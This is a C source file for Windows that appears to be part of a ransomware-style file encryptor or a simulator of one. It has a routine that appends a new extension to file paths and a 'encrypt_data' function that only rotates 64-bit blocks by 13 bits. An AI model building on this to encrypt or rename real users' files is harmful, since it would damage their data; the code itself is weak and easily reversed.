#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <windows.h>
#include "file_utils.h"
#include "encrypt.h"
#include "stack.h"
#include "sync.h"

static inline void lr13(uint64_t *data) {
    *data = (*data << 13) | (*data >> (64 - 13));
}

static inline void lr13_reverse(uint64_t *data) {
    *data = (*data >> 13) | (*data << (64 - 13));
}

wchar_t *add_extension(wchar_t *file_path) {
    if(file_path == NULL) return NULL;
    wchar_t *output;
    wchar_t ext[] = EXT;
    size_t file_len = wcslen(file_path);
    size_t ext_len = wcslen(ext);

    if(file_len + ext_len + 1 > 260) return NULL;

    output = calloc(file_len + ext_len + 1, sizeof(wchar_t));
    if(output == NULL) return NULL;

    wcscpy(output, file_path);
    wcscat(output, ext);
    return output;
}

void encrypt_data(LPCVOID p_src, LPVOID p_dest, DWORD file_size) {
    uint64_t *src_data = (uint64_t *)p_src;
    uint64_t *dest_data = (uint64_t *)p_dest;
    size_t num_blocks = file_size / sizeof(uint64_t);

    for(size_t i = 0; i < num_blocks; ++i) {
        dest_data[i] = src_data[i];
        lr13(&dest_data[i]);
    }

    size_t remaining_bytes = file_size % sizeof(uint64_t);
    if(remaining_bytes > 0) {
        const char *src_tail = (const char *)(src_data + num_blocks);
        char *dest_tail = (char *)(dest_data + num_blocks);
        for(size_t i = 0; i < remaining_bytes; i++) {
            dest_tail[i] = src_tail[i];
        }
    }
}
